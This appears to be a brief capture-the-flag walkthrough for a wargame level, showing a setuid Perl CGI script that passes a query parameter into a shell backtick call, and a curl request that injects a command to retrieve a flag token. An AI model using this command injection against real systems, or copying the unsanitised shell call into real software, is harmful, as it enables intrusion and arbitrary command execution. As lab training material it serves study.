
-> ls -la

There is a file that seems intereting

-rwsr-sr-x 1 flag04 level04 ... level04.pl

Again an executable file

-> ./level04.pl

Content-type: text/html

-> cat level04.pl

#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
}
x(param("x"));

-> curl 'localhost:4747/level04.pl?x=`getflag`'

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

-> su level05 ..